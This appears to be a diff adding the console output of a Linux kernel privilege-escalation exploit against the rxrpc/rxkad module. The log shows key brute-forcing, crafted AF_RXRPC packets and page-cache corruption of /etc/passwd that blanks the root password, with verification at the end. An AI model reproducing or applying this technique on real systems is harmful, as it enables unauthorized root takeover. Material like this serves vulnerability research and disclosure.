@@ -1,0 +1,49 @@
+
+=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===
+[*] uid=1001 euid=1001 gid=1001
+[+] rxrpc module autoloaded via dummy socket(AF_RXRPC)
+[+] target /etc/passwd opened RO, size=1838, uid=0 gid=0 mode=0644
+[+] mmap'd /etc/passwd page-cache at 0x79096f76f000 (PROT_READ|MAP_SHARED)
+[+] /etc/passwd line 1 first 16 bytes:
+72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 
+[*] /etc/passwd line 1 (root entry) BEFORE: 'root:x:0:0:root:/root:/bin/bash$'
+[+] Ca @ 4: 3a783a303a303a72 ":x:0:0:r"
+[+] Cb @ 6: 3a303a303a726f6f ":0:0:roo"
+[+] Cc @ 8: 3a303a726f6f743a ":0:root:"
+[+] fcrypt selftest OK
+
+=== STAGE 1a: search K_A (chars 4-5 := "::")  prob ~1.5e-5 ===
+[+] K_A found after 54711 iters in 0.03s (1.60M/s) K=5efd5a19625d8528  P=3a3aa871d057a5d5 "::.q.W.."
+[+] Cb_actual (after splice A) = a871d057a5d56f6f
+
+=== STAGE 1b: search K_B (chars 6-7 := "0:")  prob ~1.5e-5 ===
+[+] K_B found after 99330 iters in 0.06s (1.63M/s) K=64ff555027ff4479  P=303a19bdaeabcab2 "0:......"
+[+] Cc_actual (after splice B) = 19bdaeabcab2743a
+
+=== STAGE 1c: search K_C (chars 8-15 := "0:GGGGGG:")  prob ~5.4e-8 ===
+[+] K_C found after 21061142 iters in 4.88s (4.31M/s) K=91db4e3624635d5a  P=303a97ca8794b33a "0:.....:"
+
+[+] Predicted post-corruption /etc/passwd line 1:
+    "root::0:0:.....:/root:/bin/bash"
+
+=== STAGE 2a: kernel trigger A @ off 4 (set chars 4-5 "::") ===
+[+] plain UDP fake-server bound :7779
+[+] AF_RXRPC client bound :7780
+[+] client sendmsg 8 B → :7779 (handshake will follow asynchronously)
+
+=== STAGE 2b: kernel trigger B @ off 6 (set chars 6-7 "0:") ===
+[+] plain UDP fake-server bound :7781
+[+] AF_RXRPC client bound :7782
+[+] client sendmsg 8 B → :7781 (handshake will follow asynchronously)
+
+=== STAGE 2c: kernel trigger C @ off 8 (set chars 8-15 "0:GGGGGG:") ===
+[+] plain UDP fake-server bound :7783
+[+] AF_RXRPC client bound :7784
+[+] client sendmsg 8 B → :7783 (handshake will follow asynchronously)
+[*] /etc/passwd line 1 (root entry) AFTER:  'root::0:0:.....:/root:/bin/bash$'
+
+[!!!] HIT — root entry now has empty passwd field, uid=0, gid=0, dir=/root, shell=/bin/bash.
+
+=== STAGE 3: independent verify via `getent passwd root` ===
+[getent passwd root] root::0:0:�ʇ��:/root:/bin/bash
+[+] PRIMITIVE proven: root entry has empty passwd field via NSS.
